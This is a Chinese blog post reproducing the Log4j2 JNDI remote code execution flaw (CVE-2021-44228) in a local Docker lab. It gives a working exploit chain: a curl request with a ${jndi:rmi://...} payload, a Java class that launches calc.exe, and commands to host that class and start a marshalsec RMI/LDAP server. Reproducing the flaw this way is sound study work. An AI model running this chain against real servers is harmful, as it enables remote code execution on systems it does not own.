#import "../../shared/blog.typ": blog-post, sidenote, theorem, definition, lemma, corollary
#show: blog-post.with(
  title: "Log4j远程代码执行漏洞的复现",
  date: "2021-12-10",
  tags: ("安全", "闲话编程"),
  lang: "zh",
)

Log4j2突然爆出个大漏洞，闹得全世界都在修这个问题。但这个问题到底能不能复现出来呢？花了一些时间，终于折腾出来了。

= 如何复现
<如何复现>
== 准备复现环境
<准备复现环境>
已经有安全平台准备了测试的docker镜像：

```bash
docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest
```

反编译看了一下里面的内容，其实特别简单：

```java
@SpringBootApplication
@RestController
public class Log4j2RceApplication {
    private static final Logger logger = LogManager.getLogger(Log4j2RceApplication.class);

    public Log4j2RceApplication() {
    }

    public static void main(String[] args) {
        SpringApplication.run(Log4j2RceApplication.class, args);
    }

    @PostMapping({"/hello"})
    public String hello(String payload) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        logger.error("{}", payload);
        logger.info("{}", payload);
        logger.info(payload);
        logger.error(payload);
        return "ok";
    }
}
```

当启动上面的程序后，直接调用就可以测试：

```bash
curl --request POST \
  --url http://localhost:8080/hello \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --data 'payload=${jndi:rmi://localhost:1099/ExecTest}' \
  --data = \
  --data =
```

可以看到日志中打印出来JNDI相关的日志。但是我们的目标不仅于此，如何真正执行一些有意思的操作，比如开启个计算器？

== 编写恶意代码
<编写恶意代码>
准备一个简单的"恶意代码"，这个类在初始化的时候调用系统进程：

```java
public class ExecTest {
    public ExecTest() {
        try {
            System.out.println("You're Hacked!!!");
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

将其编译为.class文件，并需要发布到网络地址上，最简单的是用Tomcat或者python来弄，比如：

```bash
cd target/classes
python3 -m SimpleHTTPServer 
```

== 启动RMI服务
<启动rmi服务>
使用https:/\/github.com/mbechler/marshalsec可以快速启动RMI
或者LDAP，这个工具需要自己编译：

```bash
mvn clean package -D"maven.test.skip"=true
 java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#ExecTest
 # java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/\#ExecTest 1389
```

== 测试
<测试>
在之前的请求内容中填上RMI的地址，\${jndi:rmi:/\/localhost:1099/ExecTest}
调用成功后即可弹出计算器。

- https:/\/nosec.org/home/detail/4917.html
- https:/\/github.com/apache/logging-log4j2/commit/7fe72d6
- https:/\/securityboulevard.com/2021/12/log4shell-jndi-injection-via-attackable-log4j/
- https:/\/nvd.nist.gov/vuln/detail/CVE-2021-44228
